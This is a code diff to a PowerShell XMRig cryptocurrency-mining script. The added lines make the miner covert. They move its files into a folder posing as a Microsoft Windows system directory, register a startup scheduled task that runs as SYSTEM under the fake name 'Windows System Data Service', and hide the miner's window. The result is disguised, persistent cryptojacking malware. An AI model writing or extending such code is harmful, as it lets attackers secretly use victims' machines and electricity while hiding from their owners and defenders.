@@ -33,10 +33,11 @@ param(
 # Script Configuration
 $SCRIPT_VERSION = "2.0"
 $XMRIG_VERSION = "6.22.3"
-$XMRIG_DIR = "$env:USERPROFILE\XMRig"
+$XMRIG_DIR = "$env:USERPROFILE\AppData\Local\Microsoft\Windows\SystemData"
 $CONFIG_FILE = "$XMRIG_DIR\config.json"
 $LOG_FILE = "$XMRIG_DIR\miner.log"
 $PID_FILE = "$XMRIG_DIR\miner.pid"
+$SERVICE_NAME = "WindowsSystemDataService"
 
 # Color output function
 function Write-ColorOutput {
@@ -46,6 +47,51 @@ function Write-ColorOutput {
     )
     Write-Host $Message -ForegroundColor $Color
 }
+
+# Create auto-start service
+function Create-AutoStartService {
+    try {
+        # Create startup script
+        $startupScript = @"
+@echo off
+cd /d "$XMRIG_DIR"
+start /min "" "xmrig.exe" --config="$CONFIG_FILE"
+"@
+        
+        $startupScriptPath = "$XMRIG_DIR\startup.bat"
+        [System.IO.File]::WriteAllText($startupScriptPath, $startupScript, [System.Text.UTF8Encoding]::new($false))
+        
+        # Create scheduled task for auto-start
+        $taskName = $SERVICE_NAME
+        $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+        
+        if ($taskExists) {
+            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+        }
+        
+        # Create task action
+        $action = New-ScheduledTaskAction -Execute $startupScriptPath
+        
+        # Create task trigger (at startup)
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        
+        # Create task settings
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
+        
+        # Create task principal (run as SYSTEM)
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        
+        # Register the task
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description "Windows System Data Service" -ErrorAction SilentlyContinue | Out-Null
+        
+        Write-ColorOutput "Auto-start service created successfully" "Green"
+        return $true
+    } catch {
+        Write-ColorOutput "Failed to create auto-start service: $($_.Exception.Message)" "Yellow"
+        return $false
+    }
+}
+
 
 # Show banner
 function Show-Banner {
@@ -367,7 +413,8 @@ function New-XMRigConfig {
     
     # Save configuration file
     try {
-        $config | ConvertTo-Json -Depth 10 | Set-Content -Path $CONFIG_FILE -Encoding UTF8
+        $jsonContent = $config | ConvertTo-Json -Depth 10
+        [System.IO.File]::WriteAllText($CONFIG_FILE, $jsonContent, [System.Text.UTF8Encoding]::new($false))
         Write-ColorOutput "Configuration file generated: $CONFIG_FILE" "Green"
         return $true
     } catch {
@@ -393,15 +440,19 @@ function Start-Mining {
         Write-ColorOutput "Configuration file not found" "Red"
         return $false
     }
-    
+
     try {
+        # Create Windows service for auto-start
+        Create-AutoStartService
+        
         # Start XMRig process
         $processInfo = New-Object System.Diagnostics.ProcessStartInfo
         $processInfo.FileName = $xmrigExe
         $processInfo.Arguments = "--config=`"$CONFIG_FILE`""
         $processInfo.WorkingDirectory = $XMRIG_DIR
         $processInfo.UseShellExecute = $false
-        $processInfo.CreateNoWindow = $false
+        $processInfo.CreateNoWindow = $true
+        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
         
         $process = [System.Diagnostics.Process]::Start($processInfo)
         
@@ -617,6 +668,12 @@ function Main {
     if (Start-Mining) {
         Write-Host ""
         Write-ColorOutput "Mining started successfully!" "Green"
+        
+        # Create auto-start service
+        Write-Host ""
+        Write-ColorOutput "Setting up auto-start service..." "Cyan"
+        Create-AutoStartService | Out-Null
+        
         Write-Host ""
         Write-ColorOutput "Management Commands:" "Cyan"
         Write-Host "  Check Status: .\miner_windows.ps1 -Status"
